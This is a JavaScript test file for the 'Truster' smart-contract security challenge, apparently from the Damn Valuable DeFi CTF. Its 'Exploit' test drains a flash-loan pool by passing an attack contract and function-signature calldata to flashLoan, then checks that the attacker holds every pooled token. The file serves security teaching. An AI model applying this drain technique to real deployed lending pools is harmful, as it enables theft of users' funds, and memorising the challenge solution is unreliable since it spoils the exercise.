const { ether } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');
const ethers = require('ethers');

const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');
const TrusterLenderPoolAttack = contract.fromArtifact('TrusterLenderPoolAttack');

const { expect } = require('chai');

describe('[Challenge] Truster', function () {

    const [deployer, attacker, ...otherAccounts] = accounts;

    const TOKENS_IN_POOL = ether('1000000');

    before(async function () {
        /** SETUP SCENARIO */
        this.token = await DamnValuableToken.new({ from: deployer });
        this.pool = await TrusterLenderPool.new(this.token.address, { from: deployer });
        this.attack = await TrusterLenderPoolAttack.new(this.token.address, this.pool.address, { from: attacker });

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.bignumber.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker)
        ).to.be.bignumber.equal('0');
    });

    it('Exploit', async function () {
        this.pool.flashLoan(1000, this.attack.address, this.attack.address, this.attack.abi[1].signature);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.token.balanceOf(attacker)
        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.bignumber.equal('0');
    });
});
